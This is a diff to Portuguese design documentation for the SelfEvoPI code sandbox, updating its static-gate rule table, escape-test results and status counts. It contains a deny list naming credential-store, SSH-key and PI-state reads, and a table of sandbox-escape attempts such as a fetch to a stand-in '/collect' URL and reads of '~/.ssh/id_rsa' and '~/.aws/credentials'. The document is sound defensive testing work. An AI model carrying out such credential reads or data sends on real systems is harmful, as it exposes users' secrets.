@@ -36,7 +36,8 @@ A ordem importa: o gate é barato e determinístico, então roda primeiro. O Per
 | Regra | Alvo |
 |:---|:---|
 | `ssh-access` | leitura de chaves SSH |
-| `credential-store` | acesso a arquivos de credencial conhecidos |
+| `credential-store` | acesso a arquivos de credencial conhecidos (`.pi/auth.json`, `.aws/credentials`, `*.pem`) |
+| `pi-state-access` | configuração e credenciais do PI: `.pi/settings.json`, `.pi/agent/*`, `.pi/auth/*` |
 | `userprofile-config` | leitura da configuração do usuário |
 | `registry-exe` | `reg.exe` e consulta ao registro |
 | `recursive-force-delete` | deleção recursiva de árvore |
@@ -45,7 +46,7 @@ A ordem importa: o gate é barato e determinístico, então roda primeiro. O Per
 | `dynamic-eval` | `eval` e `Function` dinâmico |
 | `secret-env-read` | leitura de variáveis de ambiente sensíveis |
 | `embedded-secret` | segredo escrito no próprio código |
-| `pi-config-access` | acesso à configuração do PI |
+| `pi-config-access` | acesso à configuração do PI (aviso; bloqueio é `pi-state-access`) |
 | `outside-workspace-path` | caminho fora do worktree |
 | `process-env-read` | leitura genérica de `process.env` |
 
@@ -68,6 +69,7 @@ Duas decisões de projeto que evitam falso positivo:
 | `dynamic-eval` | |
 | `secret-env-read` | |
 | `embedded-secret` | |
+| `pi-state-access` | |
 
 ### Limitações (explícitas)
 
@@ -195,59 +197,82 @@ Um artefato só é promovido se passar nas três. Falhar em qualquer uma devolve
 A suíte comum prova que o gate **classifica**. Este arquivo prova que o processo **não sai**. Cada caso é um artefato malicioso real, rodado duas vezes: com o gate ligado (caminho de produção) e com `precheck: false`, para isolar a camada 2 — se o runtime deixasse passar, o artefato passaria na segunda.
 
 ```powershell
-node --test core/sandbox/escape.test.mjs    # 8 passam
+node --test core/sandbox/escape.test.mjs    # 13 passam
 ```
 
 | Tentativa | Camada que barrou | Evidência (stderr, com `precheck: false`) |
 |:---|:---|:---|
 | `fetch("https://example.invalid/collect?d=1")` | gate + runtime | `Error: SelfEvoPI sandbox: fetch bloqueado` |
 | ler `C:/Windows/System32/drivers/etc/hosts` | **runtime** | `Access to this API has been restricted. Use --allow-fs-read` |
-| escrever em `os.homedir()` | **runtime** | `Access to this API has been restricted. Use --allow-fs-write` |
-| `spawnSync("node", ["-e", "…"])` | gate + runtime | `Access to this API has been restricted. Use --allow-child-process` |
-| ler `~/.ssh/id_rsa` | gate + runtime | `Access to this API has been restricted. Use --allow-fs-read` |
-| ler `~/.aws/credentials` | **runtime** | `Access to this API has been restricted. Use --allow-fs-read` |
-| ler `~/.config/opencode/auth.json` | gate + runtime | `Access to this API has been restricted. Use --allow-fs-read` |
-| ler `process.env.SELFEVOPI_FAKE_TOKEN` | gate + runtime | gate barra o nome; com `precheck: false` o filho imprime `TOKEN null` (ambiente mínimo) |
+| escrever em `os.homedir()` | **runtime** | `… Use --allow-fs-write` (arquivo não criado) |
+| escrever na **pasta pai** do workdir | **runtime** | `… Use --allow-fs-write` (arquivo não criado) |
+| `spawnSync("node", …)` | gate + runtime | `… Use --allow-child-process` |
+| ler `~/.ssh/id_rsa` | gate + runtime | `… Use --allow-fs-read` |
+| ler `~/.aws/credentials` | gate + runtime | `… Use --allow-fs-read` |
+| ler `~/.pi/agent/auth.json` | gate + runtime | `… Use --allow-fs-read` |
+| ler `~/.pi/agent/models.json` | gate + runtime | `… Use --allow-fs-read` |
+| ler `~/.pi/agent/models-store.json` | gate + runtime | `… Use --allow-fs-read` |
+| ler `~/.config/opencode/auth.json` | gate + runtime | `… Use --allow-fs-read` |
+| ler `.pi/settings.json` **do cwd** | **gate** | `pi-state-access`; com `precheck: false` o arquivo é lido (está dentro do workdir) |
+| ler `process.env.SELFEVOPI_FAKE_TOKEN` | gate + runtime | gate barra o nome; com `precheck: false` o filho imprime `TOKEN null` |
 
 Onde está cada caso em `core/sandbox/escape.test.mjs`:
 
 | Caso | Linha |
 |:---|:---|
-| rede (`fetch`) | 105 |
-| disco externo — leitura | 135 |
-| disco externo — escrita no home | 168 |
-| subprocesso (`spawnSync`) | 201 |
-| credenciais (`ssh`, `aws`, config do PI) | 229 (laço sobre `CASOS_DE_CREDENCIAL`) |
-| ambiente (segredo do pai) | 283 |
+| rede (`fetch`) | 107 |
+| disco externo — leitura | 137 |
+| disco externo — escrita no home | 170 |
+| subprocesso (`spawnSync`) | 203 |
+| credenciais (`ssh`, `aws`, `~/.pi/agent`, config do PI) | 273 (laço sobre `CASOS_DE_CREDENCIAL`) |
+| ambiente (segredo do pai) | 306 |
+| `.pi/settings.json` do cwd | 339 |
+| disco externo — escrita na pasta pai | 371 |
 
-Três linhas merecem leitura:
+### O que a rodada revelou
 
-- **`.aws/credentials` só é barrado pelo runtime.** O gate não tem regra para `.aws` — é regra faltando, não decisão. Se um dia o Permission Model sair de cena, esse buraco abre.
-- **O nome `SELFEVOPI_FAKE_TOKEN` é barrado duas vezes.** O gate recusa o nome (é leitura de segredo) e, com o gate desligado, o filho ainda não vê a variável: o runner passa uma allowlist de ambiente, não o process.env do harness. É a única linha em que as duas camadas agem por motivos diferentes.
-- **Ler o hosts do Windows é aviso, não bloqueio, no gate.** O caminho externo é detectado e registrado; quem impede a leitura é a camada 2. É a divisão certa: o gate sabe que é suspeito, o runtime sabe se é possível.
+Três linhas mudaram de comportamento nesta rodada — eram buraco, não decisão:
 
-O teste também verifica o que **não** aconteceu: o `fetch` não pode produzir `STATUS 200` no stdout, e o arquivo no home tem de continuar inexistente. Recusar a saída de erro é fácil; provar a **ausência do efeito** é o que fecha o caso.
+| Antes | Depois | Camada corrigida |
+|:---|:---|:---|
+| `~/.pi/agent/models.json` e `models-store.json` → `warn` no gate | `block` | regra nova `pi-state-access` |
+| `.pi/settings.json` no cwd → `warn` e **arquivo lido** | `block` antes de executar | regra nova `pi-state-access` |
+| `path.join(home, ".pi", "agent", "x")` → `allow` (nenhuma regra casava) | `block` | mesma regra, com de-escape de `\\` |
 
-Nenhum caso passou. Não há buraco aberto nesta rodada.
+A regra `pi-state-access` casa `.pi/settings.json`, `.pi/settings.local.json`, `.pi/agent/*` e `.pi/auth/*` em três formatos: caminho absoluto com barra escapada, caminho relativo e `path.join(home, ".pi", "agent", …)`. Não casa `.pi/harness` nem `.pi/npm` — o teste prova os dois lados.
+
+### Limite honesto desta rodada
+
+**A camada 2 não cobre arquivo dentro do workdir.** O Node só sabe allowlist de diretório, não exclusão de arquivo: se o artefato roda com cwd = raiz do projeto, `.pi/settings.json` está dentro e o Permission Model deixa. Quem barra é a camada 1. O teste registra isso em vez de fingir cobertura dupla:
+
+```js
+assert.match(p.semGate.stdout, /CONSEGUI/, "registrado: a camada 2 não cobre arquivo dentro do workdir");
+```
+
+Regra prática que decorre daí: **artefato gerado roda em diretório temporário, nunca na raiz do projeto.** Isso é responsabilidade do coordenador, não do sandbox.
+
+O teste também verifica o que **não** aconteceu: o `fetch` não pode produzir `STATUS 200` no stdout, e nenhum arquivo pode nascer fora do workdir. Recusar a saída de erro é fácil; provar a **ausência do efeito** é o que fecha o caso.
+
+Nenhum caso passou no caminho de produção (gate ligado).
 
 ## 7. Estado
 
 | Item | Estado |
 |:---|:---|
-| Gate estático + 13 regras | implementado, 44 testes |
+| Gate estático + 14 regras | implementado, 50 testes |
 | Classificação de caminho | implementado |
 | Máscara de comentários/literais | implementado |
 | Camada 2 (Permission Model + preload + taskkill) | implementado, 15 testes |
-| Camada 2 — prova de bloqueio | implementado, 8 casos (`escape.test.mjs`) |
+| Camada 2 — prova de bloqueio | implementado, 13 casos (`escape.test.mjs`) |
 | Camada 3 (Job Objects) | **não implementado**, com motivo medido (§4) |
 | Política keep-alive | **não implementado**, com motivo (§4) |
 
 ### Comandos
 
 ```powershell
-node --test core/sandbox/static-gate.test.mjs      # 44 passam
+node --test core/sandbox/static-gate.test.mjs      # 50 passam
 node --test core/sandbox/run-sandboxed.test.mjs    # 15 passam
-node --test core/sandbox/escape.test.mjs           # 8 passam (prova de bloqueio)
+node --test core/sandbox/escape.test.mjs           # 13 passam (prova de bloqueio)
 ```
 
 O teste de timeout mata a árvore e confirma no `after()` que nenhum pid sobreviveu; se sobrasse um, a suíte falha. O `escape.test.mjs` prova o efeito, não só a classificação: stdout sem `STATUS 200` e arquivo no home inexistente.
